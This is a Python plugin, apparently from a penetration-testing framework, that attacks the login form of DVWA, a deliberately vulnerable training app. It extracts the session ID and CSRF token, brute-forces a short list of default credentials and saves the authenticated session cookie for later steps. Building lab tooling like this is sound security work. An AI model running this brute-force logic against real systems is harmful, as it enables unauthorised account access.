import urllib.request
import urllib.parse
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

CREDENTIAL_LIST = [
    ("admin", "password"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("user", "user"),
]

class DVWALoginAgent(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "AGENT-001",
            "name": "Tự động đăng nhập & Trích xuất Session",
            "cvss_score": 0.0,
            "service": "http",
            "version": "dvwa",
            "note": "Agent nội bộ - không phải CVE, CVSS=0"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service", "").lower() in ["http", "https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        try:
            login_url = f"http://{target_ip}:{target_port}/login.php"
            print(f"      [Agent] Trinh sát form đăng nhập: {login_url}")

            # Bước 1: Lấy PHPSESSID + CSRF token
            req1 = urllib.request.Request(login_url)
            resp1 = urllib.request.urlopen(req1, timeout=5)
            html = resp1.read().decode('utf-8')
            cookie_header = resp1.getheader('Set-Cookie')

            phpsessid = re.search(r'(PHPSESSID=[a-zA-Z0-9]+)', str(cookie_header)).group(1)
            user_token = re.search(r"name='user_token' value='([a-f0-9]+)'", html).group(1)

            print(f"      [Agent] PHPSESSID    : {phpsessid}")
            print(f"      [Agent] CSRF Token   : {user_token}")
            print(f"      [Agent] Brute-force credential list: {CREDENTIAL_LIST}")

            # Bước 2: Thử từng credential
            for username, password in CREDENTIAL_LIST:
                print(f"      [Agent] Thử: {username}:{password} ...")
                data = urllib.parse.urlencode({
                    'username': username,
                    'password': password,
                    'Login': 'Login',
                    'user_token': user_token
                }).encode('utf-8')

                req2 = urllib.request.Request(login_url, data=data)
                req2.add_header("Cookie", phpsessid)
                resp2 = urllib.request.urlopen(req2, timeout=5)
                final_url = resp2.geturl()

                if "login.php" not in final_url:
                    session_cookie = f"security=low; {phpsessid}"
                    context["session_cookie"] = session_cookie
                    context["credential"] = f"{username}:{password}"

                    print(f"      [Agent] ✓ Login thành công: {username}:{password}")
                    print(f"      [Agent] Session Cookie: {session_cookie}")
                    print(f"      [Agent] Lưu vào shared_context['session_cookie']")

                    return {
                        "status": "INFORMATIONAL",
                        "evidence": (
                            f"Default credential thành công.\n"
                            f"      - URL target     : {login_url}\n"
                            f"      - CSRF Token     : {user_token}\n"
                            f"      - Credential     : {username}:{password}\n"
                            f"      - Session Cookie : {session_cookie}\n"
                            f"      - Lưu vào        : shared_context['session_cookie']"
                        )
                    }

            return {"status": "FALSE_POSITIVE", "evidence": "Không brute-force được với credential list hiện tại"}

        except Exception as e:
            return {"status": "PENDING", "evidence": f"Lỗi Agent Login: {str(e)}"}
